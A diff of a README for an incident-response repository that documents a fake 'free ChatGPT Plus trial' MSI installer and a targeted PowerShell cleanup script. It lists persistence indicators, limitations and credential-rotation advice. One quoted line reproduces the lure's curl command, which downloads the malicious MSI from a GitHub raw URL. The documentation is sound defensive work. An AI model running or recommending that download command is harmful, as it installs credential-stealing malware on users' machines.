@@ -7,7 +7,7 @@ Targeted Windows cleanup and incident documentation repository for a Deno/JavaSc
 
 ---
 
-## Background
+# Background
 
 This repository documents the investigation and remediation of a suspicious MSI installer distributed through:
 
@@ -25,10 +25,10 @@ curl -Lo %temp%\s.msi https://raw.githubusercontent.com/ai-gen-profi/chatgpt-tri
 
 The README claimed the installer would help users obtain a “free ChatGPT Plus trial” using Deno and an API-based workflow.
 
-Observed behavior after execution included:
+After execution, the investigated system exhibited behavior including:
 
 * browser sessions unexpectedly closing
-* repeated account logouts (Gmail, GitHub)
+* Gmail and GitHub session logouts
 * Deno runtime installation
 * scheduled task persistence
 * Registry Run persistence
@@ -50,7 +50,7 @@ Observed behavior after execution included:
 
 This repository is **not** a generic antivirus or malware removal framework.
 
-The PowerShell script is intentionally scoped to the Indicators of Compromise (IOCs) observed during this incident, including:
+The PowerShell script is intentionally scoped to the Indicators of Compromise (IOCs) identified during this incident, including:
 
 * Scheduled Task: `\ReaderUpdate`
 * Registry Run value: `563ca209`
@@ -95,12 +95,142 @@ The payload appeared to leverage:
 
 ---
 
+# What the Script Actually Cleans
+
+The cleanup script is designed to remove the **observed payload and persistence mechanisms** identified during analysis.
+
+When executed with `-Remediate`, the script:
+
+* stops IOC-matching processes
+* removes scheduled task persistence
+* removes Registry Run persistence
+* checks HKCU/HKLM Run keys
+* checks Startup folders
+* hashes known payload files before deletion
+* removes:
+
+  * `563ca209.js`
+  * `yy.exe`
+  * `%TEMP%\s.msi`
+  * associated payload files
+* attempts MSI cleanup for product `gpt`
+* optionally removes Deno via WinGet
+* scans browser profile locations
+* generates transcript and CSV audit logs
+
+For the observed persistence chain and payload artifacts:
+
+* the script **does perform active cleanup/remediation**
+
+---
+
+# Important Limitations
+
+This script **cannot guarantee** that absolutely every malicious artifact or secondary payload has been removed.
+
+Like most DFIR/IR remediation tooling, it is:
+
+* IOC-based
+* targeted
+* intentionally conservative
+
+It does **not**:
+
+* blindly delete AppData
+* remove unknown files indiscriminately
+* act as a full antivirus engine
+
+Potential residual risks may still include:
+
+* credential/session theft
+* browser extension persistence
+* NativeMessagingHosts abuse
+* secondary payloads downloaded before cleanup
+* OAuth token exposure
+* browser cookie/session compromise
+
+---
+
+# Why This Matters
+
+The observed payload executed through:
+
+```text
+deno.exe -A
+```
+
+which grants:
+
+* unrestricted filesystem access
+* unrestricted network access
+
+This means the payload potentially had the ability to:
+
+* access browser sessions
+* exfiltrate tokens/cookies
+* download additional payloads
+* persist through other mechanisms before cleanup
+
+---
+
+# Current Assessment
+
+At the time of investigation:
+
+## Successfully Removed
+
+* scheduled task persistence
+* Registry Run persistence
+* active Deno payload execution
+* identified payload files
+* observed MSI artifacts
+
+## Not Observed After Cleanup
+
+* process respawn
+* active IOC beaconing
+* active scheduled task reinfection
+
+## Residual Risk Still Possible
+
+* credential/session exposure
+* browser persistence
+* secondary downloaded payloads
+
+---
+
+# Recommended Post-Cleanup Actions
+
+Because credential/session exposure may already have occurred, the following actions are strongly recommended:
+
+## Required
+
+* change passwords for:
+
+  * email accounts
+  * GitHub
+  * password managers
+  * financial accounts
+* revoke all active sessions
+* revoke OAuth tokens/apps
+* log out all browser sessions
+
+## Strongly Recommended
+
+* run Microsoft Defender Full Scan
+* run Microsoft Defender Offline Scan
+* run Malwarebytes or equivalent second-opinion scanner
+* review browser extensions
+* review NativeMessagingHosts
+* review additional Windows user profiles
+
+---
+
 # Requirements
 
 * Windows 10 or Windows 11
 * PowerShell 5.1 or later
 * Administrator privileges
-* Microsoft Defender enabled for follow-up scanning
 
 ---
 
@@ -111,7 +241,7 @@ The payload appeared to leverage:
 3. Run the script in audit mode first.
 4. Review generated logs and CSV outputs.
 5. Run remediation mode if findings match the observed indicators.
-6. Rotate passwords and revoke active sessions afterward.
+6. Perform password rotation and session revocation afterward.
 
 ---
 
@@ -159,29 +289,6 @@ To additionally inspect browser-related locations:
 
 ---
 
-# What the Script Does
-
-When executed with `-Remediate`, the script:
-
-* stops IOC-matching processes
-* removes the scheduled task `\ReaderUpdate`
-* removes Registry Run persistence
-* checks HKCU/HKLM Run keys
-* checks Startup folders
-* hashes known payload artifacts before deletion
-* removes:
-
-  * `563ca209.js`
-  * `yy.exe`
-  * `%TEMP%\s.msi`
-  * associated payload files
-* attempts MSI cleanup for product `gpt`
-* optionally removes Deno via WinGet
-* scans browser profile locations
-* generates transcripts and CSV audit logs
-
----
-
 # Output Files
 
 The script stores logs under:
@@ -198,51 +305,6 @@ Generated files include:
 | `actions.csv`            | Cleanup action log                  |
 | `hashes.csv`             | SHA256 hashes of observed artifacts |
 | `cleanup-report.md`      | Generated cleanup summary           |
-
----
-
-# Post-Cleanup Recommendations
-
-Because the payload executed with:
-
-```text
-deno.exe -A
-```
-
-(full filesystem/network access),
-
-the following actions are strongly recommended:
-
-* change passwords for:
-
-  * email accounts
-  * GitHub
-  * password managers
-  * financial accounts
-* revoke active sessions
-* revoke OAuth tokens
-* review browser extensions
-* review NativeMessagingHosts
-* run Microsoft Defender Full Scan or Offline Scan
-* review additional local Windows profiles if present
-
----
-
-# Risk Notes
-
-At the time of analysis:
-
-* active scheduled-task persistence was removed
-* Registry Run persistence was removed
-* active `deno.exe` payload execution stopped
-* no immediate process respawn was observed
-
-However, residual risk may still include:
-
-* credential/session theft
-* browser extension persistence
-* secondary payload delivery
-* token/session exposure before cleanup
 
 ---
 
